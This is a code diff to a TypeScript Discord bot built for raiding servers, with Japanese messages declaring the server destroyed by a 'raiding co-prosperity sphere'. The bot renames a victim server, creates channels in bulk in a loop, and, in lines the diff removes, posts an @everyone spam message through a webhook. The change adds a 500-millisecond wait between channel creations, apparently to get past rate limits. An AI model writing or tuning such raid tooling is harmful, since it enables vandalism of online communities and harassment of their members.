@@ -38,6 +38,8 @@ client.on("ready", () => {
   Logger.log(`Logged in as ${Logger.bold(client.user?.tag ?? "")}`);
 });
 
+const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
+
 client.on("interactionCreate", async (interaction: Interaction) => {
   if (interaction.isCommand()) {
     const name = interaction.commandName;
@@ -70,26 +72,12 @@ https://discord.gg/annycW3Xrk
         }
       });
 
-      const max = 32;
+      const max = 30;
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
 
-      discordServer?.channels.create({
-        name: "このサーバーは荒らし共栄圏により破壊されました。",
-        type: 0,
-      }).then(async (channel: TextChannel) => {
-          const webhook = (await channel.createWebhook({
-            name: "荒らし共栄圏",
-            avatar: "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
-          }))
-
-          webhook.send({
-            content: text + `\nこのサーバーは荒らし共栄圏により破壊されました。@everyone \n${Math.random().toString(36)}`,
-            username: "荒らし共栄圏",
-            avatarURL: "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
-          })
-      })
-
       for (let i = 0; i < max / 2; i++) {
+        await wait(500);
+
         try {
           discordServer?.channels
             .create({
